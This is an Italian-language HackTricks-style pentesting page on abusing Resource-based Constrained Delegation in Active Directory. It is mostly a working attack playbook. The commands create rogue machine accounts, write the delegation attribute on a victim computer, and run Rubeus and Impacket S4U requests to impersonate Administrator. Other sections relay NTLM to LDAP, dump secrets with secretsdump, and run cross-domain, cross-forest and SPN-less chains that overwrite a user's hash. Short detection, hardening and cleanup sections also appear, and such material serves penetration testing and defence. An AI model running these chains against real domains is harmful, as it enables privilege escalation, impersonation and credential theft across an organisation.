# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

È simile alla [Constrained Delegation](constrained-delegation.md) di base, ma **invece** di assegnare permessi a un **object** per **impersonare qualsiasi utente contro una macchina**, la Resource-based Constrained Delegation **imposta** nell'**object** chi è autorizzato a impersonare qualsiasi utente contro di esso.

In questo caso, l'object sottoposto a constrained delegation avrà un attributo chiamato _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con il nome dell'utente che può impersonare qualsiasi altro utente contro di esso.

Un'altra differenza importante tra questa Constrained Delegation e le altre delegations è che qualsiasi utente con **write permissions su un machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) può impostare **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (nelle altre forme di Delegation erano necessari i privilegi di domain admin).

### New Concepts

Nella Constrained Delegation era stato detto che il flag **`TrustedToAuthForDelegation`** all'interno del valore _userAccountControl_ dell'utente è necessario per eseguire un **S4U2Self.** Ma non è completamente vero.\
La realtà è che, anche senza quel valore, puoi eseguire un **S4U2Self** contro qualsiasi utente se sei un **service** (hai uno SPN), ma, se **possiedi `TrustedToAuthForDelegation`**, il TGS restituito sarà **Forwardable** e, se **non possiedi** quel flag, il TGS restituito **non sarà** **Forwardable**.

Tuttavia, se il **TGS** utilizzato in **S4U2Proxy** **NON è Forwardable**, un tentativo di abusare della **basic Constrain Delegation** **non funzionerà**. Ma se stai tentando di sfruttare una **Resource-Based constrain delegation**, funzionerà.

### Attack structure

> Se disponi di **write equivalent privileges** su un account **Computer**, puoi ottenere **privileged access** su quella macchina.

Supponiamo che l'attacker disponga già di **write equivalent privileges sul victim computer**.

1. L'attacker **compromette** un account che ha uno **SPN** o **ne crea uno** (“Service A”). Nota che qualsiasi _Admin User_ senza altri privilegi speciali può **creare fino a 10 Computer objects** (**_MachineAccountQuota_**) e impostare loro uno **SPN**. L'attacker può quindi semplicemente creare un Computer object e impostare uno SPN.
2. L'attacker **abusa del suo privilegio WRITE** sul victim computer (ServiceB) per configurare la resource-based constrained delegation, consentendo a ServiceA di impersonare qualsiasi utente contro quel victim computer (ServiceB).
3. L'attacker usa Rubeus per eseguire un **full S4U attack** (S4U2Self e S4U2Proxy) da Service A a Service B per un utente **con privileged access a Service B**.
1. S4U2Self (dall'account con lo SPN compromesso/creato): richiedere un **TGS di Administrator verso di me** (Not Forwardable).
2. S4U2Proxy: usare il **not Forwardable TGS** del passaggio precedente per richiedere un **TGS** da **Administrator** verso l'**host vittima**.
3. Anche se stai usando un TGS not Forwardable, poiché stai sfruttando la Resource-based constrained delegation, funzionerà.
4. L'attacker può eseguire **pass-the-ticket** e **impersonare** l'utente per ottenere **accesso al victim ServiceB**.

Per verificare la _**MachineAccountQuota**_ del domain puoi usare:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attacco

### Creazione di un oggetto computer

Puoi creare un oggetto computer all'interno del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurazione della Resource-based Constrained Delegation

**Utilizzando il modulo PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utilizzo di powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Esecuzione di un attacco S4U completo (Windows/Rubeus)

Innanzitutto, abbiamo creato il nuovo oggetto Computer con la password `123456`, quindi ci serve l'hash di quella password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Questo stamperà gli hash RC4 e AES per quell'account.\
Ora è possibile eseguire l'attacco:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puoi generare più ticket per più servizi effettuando una sola richiesta usando il parametro `/altservice` di Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Nota che gli utenti hanno un attributo chiamato "**Cannot be delegated**". Se un utente ha questo attributo impostato su True, non potrai impersonarlo. Questa proprietà può essere visualizzata all'interno di BloodHound.

### Linux tooling: end-to-end RBCD con Impacket (2024+)

Se operi da Linux, puoi eseguire l'intera catena RBCD utilizzando gli strumenti ufficiali di Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Note
- Se la firma LDAP/LDAPS è applicata, usa `impacket-rbcd -use-ldaps ...`.
- Preferisci le chiavi AES; molti domini moderni limitano RC4. Sia Impacket sia Rubeus supportano flussi esclusivamente AES.
- Impacket può riscrivere `sname` ("AnySPN") per alcuni strumenti, ma ottieni lo SPN corretto quando possibile (ad es., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD tra domini e tra forest

Se il **delegating principal** che controlli risiede in un **dominio diverso** (o persino in una **forest diversa**) rispetto al resource computer, l'abuso è comunque **RBCD**, ma il flusso del ticket non è più il consueto `S4U2Self -> S4U2Proxy` all'interno di un singolo dominio.

### RBCD tra domini: configura il foreign principal tramite SID

Quando imposti `msDS-AllowedToActOnBehalfOfOtherIdentity` da un **dominio diverso**, la foreign machine/user potrebbe **non essere risolvibile tramite nome** nell'LDAP del dominio target. In tal caso, configura la delega usando il **SID** del foreign principal invece del suo sAMAccountName/UPN.

Questo è particolarmente rilevante quando esegui il relay di NTLM verso LDAP con `ntlmrelayx.py`:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Note:
- `--sid` indica a `ntlmrelayx.py` di trattare `--escalate-user` come un SID, requisito necessario quando l'account delegante è esterno al dominio di destinazione.
- Anche se lo strumento stampa `User not found in LDAP`, la scrittura della delega può comunque avere esito positivo, perché il security descriptor memorizza direttamente il SID esterno.

### RBCD tra domini: sequenza S4U cross-realm

Una volta che il principal esterno è presente in `msDS-AllowedToActOnBehalfOfOtherIdentity`, il flusso cross-domain funzionante è:

1. Ottenere un **TGT** per il principal delegante dal suo dominio.
2. Richiedere un **referral TGT** per `krbtgt/<target-domain>`.
3. Richiedere un **referral cross-realm S4U2Self** per l'utente impersonato sul DC del dominio di destinazione.
4. Richiedere il ticket **S4U2Self** effettivo per quell'utente nel dominio delegante.
5. Eseguire **S4U2Proxy** nel dominio delegante per ottenere un referral ticket per il dominio di destinazione.
6. Eseguire l'**S4U2Proxy** finale sul DC del dominio di destinazione per ottenere il service ticket per `cifs/host.target`, `host/host.target`, ecc.

Questo spiega perché gli strumenti Linux standard spesso falliscono con RBCD cross-domain:
- il **realm** della richiesta potrebbe dover essere diverso dal realm del TGT utilizzato nella `TGS-REQ`
- la catena richiede passaggi **S4U2Proxy indipendenti**, non solo `S4U2Self` o `S4U2Self` seguito immediatamente da un singolo `S4U2Proxy`

### RBCD cross-domain da Linux

Synacktiv ha pubblicato un'implementazione di `getST.py` di Impacket che riproduce la sequenza cross-realm da Linux gestendo esplicitamente i due KDC:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operativamente, i nuovi argomenti sono:
- `-dc-ip`: DC del dominio **delegante**
- `-targetdomain`: dominio del **resource computer**
- `-targetdc`: DC del dominio della **risorsa**

### Limitazioni di RBCD cross-forest

RBCD cross-forest presenta un'importante limitazione: **l'utente impersonato deve appartenere alla stessa forest del principal delegante**. In altre parole, se il tuo controlled machine account si trova in `valhalla.local` e la risorsa target si trova in `asgard.local`, in genere **non puoi impersonare utenti arbitrari di `asgard.local`** verso quella risorsa tramite RBCD.

È comunque sfruttabile quando:
- l'utente della **forest delegante** è un **local admin** (o dispone altrimenti di privilegi) sull'host della risorsa nell'altra forest
- un trust consente il percorso di autenticazione richiesto e il SID esterno è accettato nel security descriptor del computer target

### Peculiarità del protocollo RBCD cross-forest

RBCD cross-forest non consiste semplicemente in "cross-domain più un trust". Il flusso osservato include due peculiarità che i tool comuni storicamente non gestiscono:

1. Una richiesta **S4U2Proxy** aggiuntiva che imposta `PA-PAC-OPTIONS=branch-aware`
2. Un service ticket finale che può essere restituito usando **RC4**, anche quando sono stati richiesti altri etype

Il flusso pratico è:

1. Ottieni un TGT per il principal delegante nella forest A.
2. Richiedi **S4U2Self** per l'utente impersonato nella forest A.
3. Richiedi **S4U2Proxy** nella forest A per ottenere un referral TGT per la forest B.
4. Invia una seconda richiesta **S4U2Proxy** nella forest A **senza il ticket S4U2Self come additional ticket**, ma con `branch-aware` abilitato, per ottenere un altro referral TGT per la forest B.
5. Facoltativamente, richiedi un service ticket normale nella forest B per il principal delegante (questo ticket non è necessario per l'abuso finale).
6. Usa i referral ticket dei passaggi 3 e 4 per richiedere il ticket **S4U2Proxy** finale nella forest B per l'utente della forest A impersonato, verso lo SPN target.

### RBCD cross-forest da Linux

Lo stesso branch di Synacktiv Impacket aggiunge uno switch `-forest` per questa logica:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

Nelle **foreste multi-dominio**, sia **S4U2Self** sia **S4U2Proxy** possono essere **recursive** invece di interrompersi dopo un solo referral:

- **Recursive S4U2Self**: il primo `S4U2Self` viene inviato al **dominio dell'utente impersonato**, gli hop intermedi tra dominio padre e figlio vengono attraversati con normali referral `TGS-REQ` per `krbtgt/<REALM>`, e il **`S4U2Self` finale** viene inviato nel **dominio del delegating principal**.
- Questo significa che **possedere semplicemente un TGT** per un account computer può essere sufficiente per impersonare un **amministratore di un altro dominio nella stessa foresta** e richiedere `cifs/host`, `host/host`, `wsman/host`, ecc.
- **Recursive S4U2Proxy** segue la catena di trust allo stesso modo: gli hop intermedi riutilizzano il ticket precedente come TGT mentre richiedono il referral `krbtgt/<REALM>` successivo, e solo l'ultimo hop restituisce il ticket di servizio finale.

Un esempio pratico nella stessa foresta è:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD cross-domain / cross-forest senza SPN

Se il **delegating principal è un utente senza SPN**, l'ultimo `S4U2Self` ricorsivo fallisce con **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La soluzione consiste nel **ripetere solo l'hop finale come `S4U2Self+U2U`**.

Versione breve della catena di abuso:

1. Autenticarsi con l'**NT hash** in modo da spingere il KDC verso **RC4-HMAC (etype 23)**.
2. Richiedere prima **`-self -u2u`** e mantenere quel ticket separato dal successivo passaggio proxy.
3. Estrarre la chiave di sessione del **TGT** con `describeTicket.py`.
4. Sostituire l'**NT hash** dell'utente con quella **chiave di sessione** usando `changepasswd.py -newhashes <session_key>`.
5. Riutilizzare il ticket **`S4U2Self+U2U`** come **`-additional-ticket`** durante una richiesta **`-proxy`** separata.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Note operative:

- Quando il **primo trusted hop è già un'altra forest**, preferisci l'algoritmo **branch-aware** (`getST.py ... -forest`) per riprodurre il comportamento nativo di Windows. Se la forest esterna viene raggiunta solo **più avanti** nella catena, il flusso ricorsivo non branch-aware potrebbe comunque funzionare.
- Sui DC **Windows Server 2022/2025** recenti, forzare RC4 può fallire con **`KDC_ERR_ETYPE_NOSUPP`** a causa della deprecazione di RC4; questo può rendere **SPN-less RBCD** impossibile, anche se la RBCD classica basata su SPN continua a funzionare con AES.
- Esegui **`S4U2Self+U2U` prima di modificare l'hash/la password dell'utente**: `SamrChangePasswordUser` **non ricalcola le chiavi AES Kerberos dell'account**, quindi modificare prima la password può interrompere le successive richieste di ticket.
- L'account impersonato deve essere ancora **delegable**: **Protected Users** e gli account con **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloccano la catena.

## Note su rilevamento / hardening

- I percorsi RBCD tra domini/forest vengono ancora generalmente creati tramite **abuso ACL** o **relay-to-LDAP**. Applica **LDAP signing** e **LDAP channel binding** sui DC per interrompere i comuni percorsi di configurazione.
- Verifica chi può scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity` sugli oggetti computer e risolvi i SID memorizzati, inclusi i **foreign security principals**.
- Negli ambienti con molti trust, esamina **Selective Authentication**, **SID filtering** e verifica se gli utenti di una forest esterna dispongono di privilegi **local admin** sugli host che ospitano le risorse.

### Accesso

L'ultima riga di comando eseguirà l'**attacco S4U completo** e **inietterà il TGS** da Administrator all'host vittima nella **memoria**.\
In questo esempio è stato richiesto un TGS per il servizio **CIFS** da Administrator, quindi sarà possibile accedere a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusare di diversi service ticket

Scopri i [**service ticket disponibili qui**](silver-ticket.md#available-services).

## Enumerazione, auditing e cleanup

### Enumerare i computer con RBCD configurato

PowerShell (decodifica dell'SD per risolvere i SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (leggere o svuotare con un comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Pulizia / reimpostazione di RBCD

- PowerShell (cancellare l'attributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Errori Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: significa che Kerberos è configurato per non usare DES o RC4 e stai fornendo solo l'hash RC4. Fornisci a Rubeus almeno l'hash AES256 (oppure fornisci semplicemente gli hash rc4, aes128 e aes256). Esempio: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` per un utente normale: il principal delegante probabilmente **non ha alcun SPN**. Riprova l'**ultimo hop** come **`S4U2Self+U2U`** invece di un normale **`S4U2Self`**.
- **`KDC_ERR_ETYPE_NOSUPP`** durante **SPN-less RBCD**: i DC recenti potrebbero rifiutare il percorso **RC4-HMAC** forzato richiesto dal trucco **`S4U2Self+U2U` + sostituzione della chiave di sessione**. Prova invece un percorso RBCD classico **basato su SPN** con AES.
- **`KRB_AP_ERR_SKEW`**: significa che l'orario del computer attuale è diverso da quello del DC e Kerberos non funziona correttamente.
- **`preauth_failed`**: significa che il nome utente e gli hash forniti non funzionano per il login. Potresti aver dimenticato di inserire il carattere "$" nel nome utente durante la generazione degli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: può significare:
- L'utente che stai tentando di impersonare non può accedere al servizio desiderato (perché non puoi impersonarlo o perché non dispone di privilegi sufficienti)
- Il servizio richiesto non esiste (se richiedi un ticket per winrm ma winrm non è in esecuzione)
- Il fakecomputer creato ha perso i propri privilegi sul server vulnerabile e devi concederglieli nuovamente.
- Stai abusando del KCD classico; ricorda che RBCD funziona con ticket S4U2Self non inoltrabili, mentre KCD richiede ticket inoltrabili.

## Note, relay e alternative

- Puoi anche scrivere l'RBCD SD tramite Active Directory Web Services (ADWS) se LDAP è filtrato. Vedi:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Le catene di Kerberos relay terminano spesso in RBCD per ottenere SYSTEM locale in un solo passaggio. Vedi esempi pratici end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Se la firma LDAP e il channel binding sono **disabilitati** e puoi creare un machine account, strumenti come **KrbRelayUp** possono inoltrare un'autenticazione Kerberos indotta verso LDAP, impostare `msDS-AllowedToActOnBehalfOfOtherIdentity` per il tuo machine account sull'oggetto computer target e impersonare immediatamente **Administrator** tramite S4U da un host esterno.

## Riferimenti

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (officiale): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Cheatsheet rapida per Linux con sintassi recente: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
